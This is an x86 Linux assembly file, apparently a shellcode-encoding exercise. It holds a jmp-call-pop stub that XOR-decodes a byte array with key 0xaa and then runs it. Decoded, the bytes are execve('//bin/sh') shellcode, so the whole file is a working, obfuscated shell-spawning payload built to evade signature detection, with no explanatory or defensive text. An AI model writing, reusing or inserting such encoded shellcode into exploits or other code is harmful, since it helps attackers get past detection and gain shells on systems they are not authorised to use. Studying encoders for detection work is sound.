; XORdecode.asm

global _start

section .text

_start:

	jmp short shellcode
decoder:
	pop esi
decode:
	xor byte [esi], 0xaa
	jz eshellcode
	inc esi
	jmp decode


shellcode:
	call decoder
	eshellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa